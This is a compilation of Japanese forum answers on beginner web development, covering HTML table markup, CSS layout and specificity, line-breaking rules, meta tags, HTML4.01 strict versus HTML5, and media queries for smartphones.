onclick='cal_move("+calId+",null);' value='-' />"; calHTML += "<input type='button' onclick='cal_move("+calId+",1);' value='next &gt;' />"; calHTML += "</div>"; calHTML += "<p>" + year + "年" + calObj.monthName[month] + "</p></th></tr>"; */ /* 以下に書き換えました。 */ var calHTML = "<table border='0' cellspacing='0' cellpadding='0' class='cal'>"; calHTML += "<tr>"; calHTML += "<th>"; calHTML += "<div class='cal_ui'>"; calHTML += "<input type='button' onclick='cal_move("+calId+",-1);' value='&lt; prev' />"; calHTML += "</div>"; calHTML += "</th>"; calHTML += "<th colspan='5'>"; calHTML += "<p>" + year + "年" + calObj.monthName[month] + "</p>"; calHTML += "</th>"; calHTML += "<th>"; calHTML += "<div class='cal_ui'>"; calHTML += "<input type='button' onclick='cal_move("+calId+",1);' value='next &gt;' />"; calHTML += "</div>"; calHTML += "</th>"; －－－－－－－－－－－－－ 以上です。 やったことは、 Javascriptの書き出しを <th>prev</th> <th colspan='5'>年月日</th> <th>next</th> に書き換えて、CSSで指定されていたfloatを無効化。 といった具合です。 ご参考までに。
「PHPやHTMLを入力すると色が変わるメモ帳ソフト」というと、うーんと考えてしまいますが……。入力支援機能が組み込まれたオンライン開発ツール、ということでよろしいでしょうか。私が利用してるのはだいたい以下の２つです。 Cloud9　（https://c9.io/） Codenvy IDE　（https://codenvy.com/） どちらもHTML、CSS、JavaScript、PHP、Ruby、Java、Pythonといった主要言語に対応してるはずです。またデプロイ先のクラウドサービスとして、GAE、Heroku、OpenShiftなどに対応しています。私はGAEやHerokuをよく利用するので重宝しています。 ただし、クラウド（IaaSやPaaS）でない、普通のレンタルサーバーなどにアップロードするのには使えないと思います。基本的に、クラウド開発ツールはクラウドサービスにデプロイすることを前提で作ってある、と考えていいでしょう。
ttps://www.google.co.jp/search?q=%22lab.synck.com%2FCal3.0%2F%22 グーグル検索 ttp://www.synck.com/contents/download/javascript/cal2.1.html 「設置作業にはちょっぴり知識が必要になったかもしれません。」 しっかりダウンロードできているのでしょうか？ 表示のデモを使うということ？Cal3.0？ <style type="text/css">を追加 前のお方の記載を利用。 <link rel="stylesheet" href="cal.css" type="text/css"> <style type="text/css"> div.schedule_wrapper,div.cal_wrapper {float: left; div.cal_wrapper {clear: left;} </style>
念のために聞きますが、リンクの飛びたい先は http://blog.fc2.com/?linkid=artmangallery じゃなくって http://ameblo.jp/pumpkin-seeds-hikikomori/ ですよね? でしたら <a href='http://ameblo.jp/pumpkin-seeds-hikikomori/'>不登校・引きこもり自助グループ＠京都～ゆんたく～</a> でできるはずです。 というか、なんで単に href 指定でできることで JavaScript を使っているのでしょうか?
keywordsはどうでもいいでしょう。検索エンジンはいまどきそんなところを見てインデックスを作成したりしないでしょう。 descriptionは現在でもgoogleで使用されており、検索結果の概要欄にdescriptionの内容そのままで表示される事もありますので、descriptionは書いた方がいいです。登録して日が浅い頃か、googleがまだそのページの価値が低いと判断しているうちなのか条件はよくわかりませんが。 また、各ページの概要を記述する部分なので、各ページで内容が異なっているべきです。 >そしてページ１つ１つ統一した場合と統一しなかった場合の違いはなんなんでしょうか？ 統一した場合には、googleで検索した時にどのページも同じ概要で表示される可能性があります。
ヒント <table border=1> <tr><td colspan=4>hoge</td></tr> <tr><td rowspan=5>hoge</td><td colspan=3>hoge</td></tr> <tr><td>hoge</td><td>hoge</td><td>hoge</td></tr> <tr><td>hoge</td><td>hoge</td><td>hoge</td></tr> <tr><td>hoge</td><td>hoge</td><td>hoge</td></tr> <tr><td>hoge</td><td>hoge</td><td>hoge</td></tr> </table> >tableの中にtableが入ってる感じです。 こっちはむしろ簡単です。 なので、難しいほうで、書いてみました。 これを改造すると、思った結果が得られますよ。 （あえて"回答"以外を回答しています）
<dvi class="xxx"> <span class="a">水戸光圀</span>／<span class="b">東野英治郎</span><br> <span class="a">佐々木すけさぶろう</span>／<span class="b">里見浩太朗</span> </div> pはパラグラフ（段落）のpなので、 あっているかあっていないかは議論がわかれるところかも。 幅を考えるならもう少し工夫がいるかもしれないし、 <li>とかのタグを使うべきだと私は思うが、、改行したいなら<br>でいいのでは？ htmｌをもう少し勉強しましょう。
http://html5.sophia-it.com/reference/%E9%9F%B3%E5%A3%B0%E3%82%92%E5%86%8D%E7%94%9F%E3%81%99%E3%82%8B%E3%81%AB%E3%81%AF%EF%BC%9F WMAが、原因かも。 MP3だとどうですか？
＞最近、Windows7へ上げ、同じHTMLをIE11で開いたところ、#つきの画像が表示できなくなった次第です。 　だとしたら、その動作が正常です。 　#は本来ブラウザがサーバーに要求してはならない文字です。 よって、URLエンコードしなければなりません。 <p align="center"><img src="Desert%231.jpg"></p>
で、offsetTopの値は確認できたの？ scrollの直前に alertで出力してみればいいと思うわ ちなみに、そのテキストボックスより下には 十分な空きスペースがあるのよね？ 無い場合あたりまえだけど一番上にはいかないからね せいぜい真ん中止まりよ
<table> <tr> <th></th> <th colspan="6"></th> </tr> <tr> <td></td> <td colspan="6"></td> </tr> <tr> <td></td> <td colspan="3"></td> <td colspan="3"></td> </tr> <tr> <td></td> <td colspan="2"></td> <td colspan="2"></td> <td colspan="2"></td> </tr> <tr> <td></td> <td colspan="6"></td> </tr> </table> ……ところで、なぜこのような表を作る必要が出てきたのでしょうか？
＞複数表示させるにはどうすればいいのでしょうか。 　単にスタイルシートだけの問題になりますから(^^)・・HTMLもjavascriptもほとんど手を加える必要がない。そもそも、そうすべき事はわかりますよね。 1) javascript部分の変更 　外部スタイルシートにしたほうが良い var css = new Array( '<link rel="stylesheet" type="text/css" media="screen" href="CSS/1.css">', '<link rel="stylesheet" type="text/css" media="screen" href="CSS/2.css">', '<link rel="stylesheet" type="text/css" media="screen" href="CSS/3.css">', '<link rel="stylesheet" type="text/css" media="screen" href="CSS/4.css">', '<link rel="stylesheet" type="text/css" media="screen" href="CSS/5.css">', '<link rel="stylesheet" type="text/css" media="screen" href="CSS/6.css">' ); スタイルシート 6タイプ [1.css] @charset "Shift_JIS"; div.section div.nav ol li{display:list-item;} div.section div.nav ol li+li+li{display:none;} div.section{background-color:fuchsia;} div.section div.nav{border-color:red;} [2.css] @charset "Shift_JIS"; div.section div.nav ol li{display:list-item;} div.section div.nav ol li+li{display:none;} div.section div.nav ol li+li+li{display:list-item;} div.section div.nav ol li+li+li+li{display:none;} div.section{background-color:silver;} div.section div.nav{border-color:gray;} [3.css] @charset "Shift_JIS"; div.section div.nav ol li{display:list-item;} div.section div.nav ol li+li{display:none;} div.section div.nav ol li+li+li+li{display:list-item;} div.section{background-color:aqua;} div.section div.nav{border-color:blue;} [4.css] @charset "Shift_JIS"; div.section div.nav ol li{display:none;} div.section div.nav ol li+li{display:list-item;} div.section div.nav ol li+li+li+li+li{display:list-item;} div.section{background-color:yellow;} div.section div.nav{border-color:orange;} [5.css] @charset "Shift_JIS"; div.section div.nav ol li{display:none;} div.section div.nav ol li+li{display:list-item;} div.section div.nav ol li+li+li{display:none;} div.section div.nav ol li+li+li+li{display:list-item;} div.section{background-color:lime;} div.section div.nav{border-color:green;} [6.css] @charset "Shift_JIS"; div.section div.nav ol li{display:none;} div.section div.nav ol li+li+li{display:list-item;} div.section div.nav{border-color:silver;} 注意) 　まず、HTMLやスタイルシートをきちんと身につけましょう。 　デザインや動作なんて、よっぽど酷くさえなければ、ユーザーはコンテンツの充実だけで訪問してくる。 『どうすれば自分のウェブサイトが独自性、価値、または魅力のあるサイトといえるようになるかを考えてみる。同分野の他のサイトとの差別化を図ります。( https://support.google.com/webmasters/answer/35769?hl=ja#3 )』 　はデザインじゃない、内要素のものなのですよ。
HTML5じゃない!!! <!DOCTYPE HTML><!-- 小文字のほうがよいかも --> <html><!-- langは必須 --> <head> <meta charset="utf-8"> ・・・【中略】・・・ </head> <body> <center><!-- centerは使えない --> <a href="index.html">戻る</a><!-- a要素はbodyには書けない --> <table border="5"> <tr bgcolor="#1FD3DF"> ・・・以下width,height,bgcolorは使ってはなりません。 </body> </html> ★javascriptではなくCGIを使うほうが良いでしょう。 ★widthやheightを指定せず、スタイルシートで%指定しましょう。 ★表は表示幅に合わせて伸縮してくれます。 その内容でしたら、HTML5の必要はない。簡単なHTML4.01で十分です。ただしstrictにして、デザインはスタイルシートで。
たぶん、こういうことでしょうか。 <style> #sample1 { margin: auto; width: 900px; } </style> ---------- 質問文に書かれているこの書き方ですが、 sample1{ float:left: } もしBBSへの投稿時のコピーミスでなければ、これは機能していません。 #sample1 とするか、 <div class="sample1"> として、 .sample1 {} と書かなければ行けません。 これらCSSの書き方（文法）については、解説書や解説サイトなどで確認してください。 http://htmq.com/
＞現在、htmlを勉強してメモ帳を使いHPサイトを作っているのですが、 　HTML(頭文字ですから必ず大文字です) 　HPサイトじゃ意味が通じません。ヒューレッドパッカード社(hp)のことじゃないと思いますが(^^)、利用する立場なら兎も角、製作立場になると「ウェブサイト」「ウェブページ」と正しく使わないと意味が通じなくなります。「ホームページに戻る」「HPに戻る( http://www8.hp.com/jp/ja/home.html )」じゃ困る。 ＞このコンピューターが差出人に識別されることを予防するため、画像がブロックされています。 　ブラウザのトラッキング防止機能が効いているのでしょう。 　画像へのパス指定を見直すこと。 　　複雑な説明になるので、説明はしません。 <HTML> <HEAD> <META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=Shift_JIS"> <TITLE>*****</TITLE> </HEAD> <BODY BGCOLOR="crimson"> <H1><font face="Beurk"size="7">*****</font></H1> <font face="HGP明朝L"size="4"></font><BR> <IMG SRC="sitd.gif"><BR> </BODY> </HTML> ・・・今から始めるには、これじゃあまりに酷すぎます。 1) 必ずDOCTYPEを書かなければなりません。 　HTML4.01strictだけに絞って身につけましょう。 　『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/conform.html#h-4.1 )』 　まもなく勧告を迎えるHTML5は、HTML4.01strictの改訂で、HTML4.01の他のDTD、transitinal,framesetはありません。 2) <font face="Beurk"size="7"> ｆｏｎｔ要素は使えません。 　HTML4.01strictにはない。transitinalでも非推奨。XHTML1.1以来廃止、HTML5にはない。 3) <font face="Beurk"size="7"> 　　<IMG SRC="sitd.gif"> 　bodyに直接は書けません。 　<body>樹構造が下記ですが・・ 　　|-- <h1></h1> 　　|-- <font>ダメ 　　|-- <img>ダメ 　　|-- <br>ダメ 　bodyにはブロック要素しか置けません。 4) <br>通常は使わないです。BRは【ひとつの段落でありながら強制改行が必要なとき】 　HTML4.01では、住所の区切りなど 　HTML5では、詩の中の折り返しなど、それ自体がコンテンツの一部であるとき 　とされています。 　　日本語の場合は、段落の変わり目は行間ではなく字下げで示しますからサンプルのようにスタイルシートで指定します。 ・・・たった数行でこれだけ深刻なミスがあるという事は参考にされているページがとってもまずいという事です。 ＞更新するたびいくつかのファイル(メニュー等)もアップロードしないといけないのは、大変ではないですか？ 　小規模なサイトでしたら、コピーペーストで書き換えて一括してFTPでアップロードします。 　・ファイルを開かなくても置換できる高機能なテキストエディタなら一括置換できます。 　大規模になれば、includeという機能を使います。いわゆるＳＳＩ(Server Side Includes)今は考えないでよい。 ★最初に参考にすべきサイト・・HTML4.01の仕様書の翻訳メンバーの内田さんの書かれたもの・・ 　⇒はじめてのWebドキュメントづくり( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) ★参考にすべきページ 　⇒HTML 4.01仕様書( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/cover.html ) 　⇒1と2の間辺りからはじめるCSS講座( http://www6.plala.or.jp/go_west/beginner/css/ ) ★書いたらまずチェックする 　⇒Another HTML-lint gateway( http://cetus.sakura.ne.jp/htmllint/htmllint.html ) 　　口うるさいくらいですが、逆にどこを直すべきかも教えてくれる。 　[最低限のサンプル]HTML4.01strictです。 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<style type="text/css"> <!-- body{ background-color:gray;/* bodyの背景gray */ } div.header,div.section,div.footer{/* header,section,footerの指定 */ width:80%;/* 幅はwindowの80% */ margin:0 auto;/* 上下0、左右自動 */ padding:5px; background-color:silver;/* 背景はシルバー */ } p{ margin:0;/* 日本語用に段落間のマージンを消し */ line-height:1.8em;/* 日本語は字が大きいので行間を広げて */ text-indent:1em;/* 段落で字下げ */ } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>質問</h2> ＿＿<p> ＿＿＿折角のサイト設立を目前に心が折れそうなので、どなたか解決方法を教えてください ＿＿</p> ＿</div> ＿<div class="section"> ＿＿<h2>回答</h2> ＿＿<p> ＿＿＿誰もが通ってきた道です。 ＿＿</p> ＿＿<p> ＿＿＿<strong>HTML4.01strictは、</strong>プレゼンテーションに関わる物が一切ないので、このように文書構造だけ記述すればよいので<strong>とっても楽です。</strong> ＿＿</p> ＿＿<p> ＿＿＿そのかわり、スタイルシートでプレゼンテーションを指定します。スタイルシートは、HTMLで行なうよりはるかに機能が豊富ですが、その分、覚えるのは大変です。しかし、いずれHTML5の時代が来ますが、そのときにはHTMLは文書構造だけ、スタイルシートはプレゼンテーションと完全に分かれますから、今のうちにHTML4.01strictで学んでおくと効率的です。 ＿＿</p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
あー、うまく行きませんでしたか。 Chromeでは確認したのですが、IEでは確認していませんでした。すみません。 もうご存知と思いますが、禁則処理は英文字の長い単語が単語の途中で改行されないように改行位置を調整する処理です。また、それに加えて、文末の記号も同様の扱いで「.」「!」などがついていればそれも単語を構成する文字とみなされるはずだと思います。 実際にChromeではそのような動きで、文末の記号の連続でも一つの単語と同じように禁則処理・その解除が行われていました。 しかしIEでは文末の記号は別扱いで、文末記号は何があっても絶対に行頭に持ってこさせない処理を行っているようです。私にはChromeの動きが正しくIEの動きがバグのような気もします。そもそも行末記号が連続することが例外とも言えますので、考慮漏れをしているのかもしれません。しかし、もしかしたらMS社として正しいと思ってそのような仕様にしているのかもしれません。 結論として 少なくとも現行バージョンのIEでは、行末記号の連続の禁則処理の制御の解除はできません。 これを回避する正当な手段は現状では存在しないと思います。 対応としては ・行末記号の連続をやめる ・行末記号の連続中で、何文字かおきに半角スペースをいれる ・「！」の連続では画像を使う(これが一番いいかも) ・IEはあきらめる 位しかないと思います。苦肉の策ですが…
禁則文字・禁則処理の問題ですね。あなたの例で言えば、行頭に「！」が表示されるのを避けようとしているのです。 禁則処理 - Wikipedia http://ja.wikipedia.org/wiki/%E7%A6%81%E5%89%87%E5%87%A6%E7%90%86 禁則処理を解除したいのであればスタイルシートに以下を追加してください。 td { word-break: break-all; word-wrap: break-word; }
うーん。 HTML5は、アプリなのかは、疑問ですが。 私は、普通のプログラマエディターのみで作っています。 デバッグは、GoogleChromeのデバッグモードのみ！ （すごいエコ） これでも、実際、業務アプリ作れてますよ。 なので、特にこだわらなくてもいいかと思います。 むしろ、接続先（PHPや、DBを使って管理するほうがずっと大変でして）
一応補足しておきます。 その試験のカリキュラムとしてはXHTMLのほうが詳しく書かれているようですが、HTMLとXHTMLという部分だけで比べた場合、内容はおそらく全く同じです。 HTMLとXHTMLと称されているその試験で違う部分はHTMLやXHTMLではなく、 「CSSの複雑さ（デザインの豊富さ）」だと思います。 もし実用をめざしてHTML/XHTMLを勉強するのであれば、（XHTMLではなく）HTMLを（HTML5として）勉強する事をお勧めしますが、 試験合格をめざすのであれば、XHTMLのカリキュラムをお勧めします。 （XHTMLを勉強するのではなく、「カリキュラム」です。 公式カリキュラム（サーティファイが出版している教科書）のXHTMLの内容は、 一般の書籍で勉強されるなら『No.3に書いたXHTMLとHTMLの違い』の部分を除き、HTMLとCSSに相当すると思います。） なお、試験そのものを無意味と言っているわけではありません。 「XHTMLという言葉を、一般用語と違う意味で使われている可能性がある」という意味です。
<meta http-equiv="X-UA-Compatible" content="IE=8"> ではないでしょうか。
セクションというのは、日本語では「章」「節」などの分類の総称です。 HTMLとして考えるのではなく、「日本語（文学）」や「英語」で考えてください。 業界ごとに呼び方は変わりますが、 第一章 　第一節 　　第一項 第一章 　第一節 　　第一幕 第一章 　第一節 　　第一款 これらの区切りを、日本語では上記の様に呼び方を変えていますが、英語では全部「section」と呼びます。 section 　sectionに入れ子になったsection（略してsection） 　　『sectionに入れ子になったsection』に入れ子になったsection（略してsection） そしてこれらのセクションを示すHTMLタグとして、<section>を使います。 articleは作品という意味です。 １つの作品に対して<article>を１つ使ってください。 いわゆるメインコンテンツに<article>を使えばいいです。 作品じゃないし、、、と思われたのであれば、<section>でいいです。 http://www.html5.jp/ メニューから、 > チュートリアル > タグリファレンス > HTML要素 > 各項目 に進んでください。 基本的にはHTML5の仕様書の邦訳です。 言い回しのような、若干わかりづらい表現はありますが、だいたいわかると思います。 http://www.html5.jp/tag/elements/div.html <div>は「その他」です。 ほかのタグでしっくり来なければ、最終手段としてグループ化したい場合に<div>を使用してください。 ほとんどの場合、デザインを目的とした使い方になると思います。 特例として、<p>（段落）の中にHTMLの文法上では許されていないテーブルや箇条書きなどを入れたい場合に、<div>を<p>の代わりに使用できます。 <div> 私の好きな果物は <ul> <li>メロン</li> <li>イチゴ</li> <li>スイカ</li> </ul> です。</div> ただしこの場合、日本語の文章を以下のように書き換える事ができますので、日本語文として適切かどうかという点で、見直し（推敲）てみて、適切な方にあわせて書くのがいいです。 <p>私の好きな果物は以下の通りです。</p> <ul> （略） </ul> <span>も同様です。 <em>や<small>など、他のタグでしっくり来ないけど色分けしたい、でもなにか目印を付けたいという場合に<span>を使ってください。
何やら他の回答者さんは難しく考えていますが 提示されたサイトと同様のものでよければonkeyupイベントで入力された文字を取得し、 ひらがな・カタカナのチェックやひらがな→カタカナの変換をして カナのフィールドに入れるだけで良いと思いますよ。 漢字のフィールドで入力し直した場合はカナが綺麗に入りませんが・・
サイト内文書、つまりHTML内でならどんな文字でもOKです。それに半角も全角も関係ありません。もちろん英数字は半角で統一した方が良いという考え方はあります。 例文での （） ですが。別に英語だから半角、日本語だから全角と言う決まりではありません。普通に海外のサイトでも、英語で全角文字で表示されてるサイトも数多くあります。究極的には全角半角の違いは、見た目の問題、作者の感性の問題とも言えます。ただし近年では前述の通り、数字とアルファベットは半角文字で統一すべきという考え方がスタンダードに成りつつあります。 で、問題の 「」 ですが…。基本的にはアルファベットに元々存在しない文字や記号、例えば ￥ ＜＞ ＃ 等の記号類は極力、全角文字表記の方が良いです。その法則で言えば 「」 も全角文字の方が良いです。今ではブラウザの性能も上がって、まずそんな事態は起こらないのですが。以前は日本語特有の 「」 や カタカナ を半角文字で打ち込んでweb上で使うと、文字化けしたり、最悪スクリプトエラーを起こしたりして色々と厄介な問題になったものですが。 P.S. 単純に英語圏に置ける日本語の会話を囲む記号に対応する記号は何か？という事でしたら。それは “” です。尚、HTML内で " を半角文字として表示させたい場合は、「HTMLエンティティ処理」と呼ばれる特別な表記方法をする必要があります。 " → &quot; ～以上のように書く必要があります。 ＞HTML特殊文字 - http://e-words.jp/p/r-htmlentity.html
どっちでもいいと思うけど あえて決めるなら <a><strong>商品名</strong></a> の方が都合がいいんじゃないかしら？ <a><strong>商品名</strong></a> に比べ <a>商品名</a> は、強調したくない商品がある、という意味にみえるけど <strong><a>商品名</a></strong> に比べ <a>商品名</a> は、強調したくないリンクがある、という意味にみえるでしょう？ だから <a><strong>商品名</strong></a> がいいと思うの どうかしら？
＞いったい、今の主流としてサイズはいくつで作るのがベストなのかな…と毎回、悩んでおります。 　すでにサイトを作られてこられたようですから、御存知だとは思いますが、下記を読み返してみてください。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 　HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 ・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML4.01仕様書HHTMLの略歴( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.2.1 )］より 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 文書の構造をプレゼンテーションと切り離すことで広汎なプラットフォームや多様なメディアでの文書提供コストを低下でき、文書の改訂も容易になるということが、経験的に知られている。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTM4.01仕様書#構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 )］より 　スマホのディスプレイ幅は本当に様々です。今後もどんどん増えていくでしょう。 　わざわざHTMLでウェブページを作るのは、たった一つの重要なこの「どんな環境からもWebの情報を利用できる」という特徴があるからですよね。 　スマートフォンは、mediaタイプで言うと、screenに属しパソコン用のものと同じです。 ＞通信が重くならず、あまり劣化が気にならないサイズについて 　現在のネット環境では従来ほど配慮しなくて良いですが、それほど重要でない画像でしたら、圧縮率や高機能な画像処理ソフトでしたら問題はないと思います。 以前回答した簡単なサンプルが 　⇒フレキシブルデザイン、リキッドデザインのimg - Webデザイン・CSS - 教えて！goo( http://oshiete.goo.ne.jp/qa/8523370.html ) 　にあります。幅広ディスプレイ～スマホ、および印刷まで対応させてあります。使用している画像自体は印刷を考慮して960px幅です。 　スマホを考慮されるなら、CSS3のbackground-sizeプロパティも使用できますし。
>縦、横の分割フレームと同等の機能がるHPだと気づきました。 フレーム機能なんてありませんよ。 単なる「2カラム」のページです。 左のメニューで右側の内容だけが変わっていると思われているのなら大間違いです、ページのURLを見れば一目瞭然、同じレイアウトの他のページに移動しただけですから。 使用したければ、2カラムのテンプレートをどうぞ。
スタイルシートでの指定・・ table.hoge th {height: 22px; この場合は詳細度が[0,0,1,2]ですね。一方ブラウザの属性での指定（height="140"）の詳細度は0です。 当然、属性での指定は上書きされます。 ・・・・height="140"　自体は正しいです。単位をつけてはなりません。 　⇒height = length [CN] ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html#adef-height-TH ) 　⇒6.4.3 セレクタの詳細度を計算する ( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/cascade.html#specificity ) 　⇒6.4.4 非CSSの見栄えヒントの優先順位 ( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/cascade.html#preshint ) 　なお、 <table summary="目次" border="1"> 　　<tbody><!-- ひとつしかないときはなくてよい --> 　　　<tr> 　　　　<td rowspan="3"><img src="img/001.gif" width="180" height="184" alt=""/></td> 　　　　<th abbr="項目1">項目１</th> 　　　　<td>文章１</td> 　　　</tr> 　　　<tr> 　　　　<th>項目２</th><td>文章２</td> 　　　</tr> 　　　<tr> 　　　　<th>項目３</th> 　　　　<td>文章３</td> 　　　</tr> 　　</tr> 　</tbody> </table> [スタイルシート] table[summary="目次"]{ 　border-collapse:separate; 　background-color: rgba(50,50,50,0.3); 　width: 640px; 　height: 184px; 　margin: 0 auto 18px; 　padding: 10px; 　border-spacing:5px 10px; } table[summary="目次"] th{ 　height: 22px; 　background-color: #7ac0c9; 　width: 80px; } table[summary="目次"] td { padding: 0 20px; } カスケーディングや詳細度は、カスケーディングスタイルシートの命ともいえるものです。プロパティより先に確実に身につけないとなりません。 5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/selector.html ) 6 プロパティ値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/cascade.html ) なお、こちらのほうが良いと思う。 <dl> 　<dt>項目1</dt> 　<dd>文章1</dd> 　<dt>項目2</dt> 　<dd>文章2</dd> 　<dt>項目3</dt> 　<dd>文章3</dd> </dl>
＞難しすぎて意味が分かりません(´；ω；｀) 　皆最初はそうだったのです。 　ただ、HTML5は膨大ですからまともに取り組めば挫折します。 　そのために、その元となったHTML4.01strictをマスターして、 HTML5 における HTML4 からの変更点( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff ) 　に進むのが最も効率的でわかりやすいです。 　HTML4.01strictは、HTML5で廃止されるプレゼンテーションに関わる要素や属性を含みません． ・3.5. 不在の要素( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#absent-elements ) ・3.6. 不在の属性( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#absent-attributes ) 　HTML4.01以前は、デザインのためにHTML要素や属性を使用していたため煩雑でした。 　HTMLスタイルシートの学び方は、まず文書構造だけをきちんとマークアップする技術や知識を身につけます。 ・Another HTML-lint gateway( http://cetus.sakura.ne.jp/htmllint/htmllint.html ) ・Another HTML Lint HTML5 - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 　でチェックすると、きちんと指摘してくれます。 　とにかく最初はシンプルなものから 　　サンプルに上げたHTMLは、わかりやすいと思います。 　そしたら、スタイルシートでデザインを学びます。 　HTMLは難しくはありません。ワードなどのワープロやDTPとは全く異なり、文書がどんな要素で組み立てられているかをマークアップするだけですから・・ 　頑張ってください。みんな通ってきた道です。 最初は 　⇒はじめてのWebドキュメントづくり( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) が本当は一番良いですよ。
line-height : 160%; とかしてみたらどーかしら？
スマホはmediaでいうとパソコンと同じscreenです。ここはわかってますよね。 そして、ウェブサイトを作られているなら、当然下記は基礎ですから御存知かと・・ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる。 ・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.2.1 )］より 　単にスマホ・パソコンなんてscreemメディアだけでなく、「携帯電話、モバイル機器、音声入出力機器」プリンター、そしてなによりも検索エンジンに対応できるから、 わざわざHTMLでウェブページを作るのです。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ ＞スマホでパソコン用のページを開いた時に上部にリンクを付けるのはどうしたらいいのでしょうか。 　それ自体は、mediaqueryでウィンドウ幅でスタイルシートを変更すればよいです。 恒久、あるいは標準スタイルシートのmedia:screenスタイルシートで header p.goSP{display:none;} とでもしておいて @media only screen and (min-device-width: 760px){ section p.goSP{display:block;} です。 　基本的にmedia別スタイルシートと同じです。 　⇒14.2.4 出力メディア型( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/present/styles.html#h-14.2.4 ) ただ、それはターゲットをスマホだけに限定したページがある場合に限ります。 本来はmediaqueryは、パソコン用にデザインされているページをスマホ用のデザインに変えるときのためです。
スタイルを使って以下のようにするのはどうでしょうか。 ■ HTMLの中身 <html> <head> <style> table{ border: 1px solid #777777; } td{ border-top: 1px solid #777777; border-left: 1px solid #777777; border-right: 1px solid #777777; } </style> </head> <body> <table cellspacing="8" cellpadding="8" width="50%"> <tr> <td>xxxxx</td> <td>xxxxx</td> </tr> <tr> <td>xxxxx</td> <td>xxxxx</td> </tr> </table> </body> </html>
　いちいちコマを進めたりカードを捨てるたびに送信ボタンと言うわけには参りませんので、クライアント側はAjaxを使用します。 　サーバー側のプログラムは何でも良いです。
パソコン用のページとスマホ用のページを別に作っていて、 スマホ用のページはまとめてそこにおいているのでしょうね。 昔はiモード用(というか携帯電話用)のページが別に作られ 「www.○○○.com/i/」などとすることがよくありましたね。
全く問題ないです。 　私なんて、大昔に作ったHTML2.0、HTML3.2、HTML4.01strict、HTML4.01transitinal、XHTML1.1、HTML5、・・・そしてPDF,JPEG,GIF,PNGなどが同居している。 　ただ、きちんとDOCTYPE宣言と一致しているかだけはチェックしておきましょう。
phpから呼び出すとは？includeやrequireでファイル名指定で呼び出すなら、.htaccessで外部からアクセス禁止にしても大丈夫です。phpから呼び出せないとは、どんな呼び出し方をしたんでしょうか？ また、JavaScriptで呼び出すというのはブラウザから呼び出すわけなので、アクセス禁止にしてはいけません。JavaScriptで呼び出して、かつ、ユーザーから直接アクセスできないというのは仕組み的にあり得ません。カジュアルなガードとしては、Refererで制御も出来ますが、Refererは呼び出す人が設定できますので、ユーザーがReferer付きで呼び出せばアクセスできます。
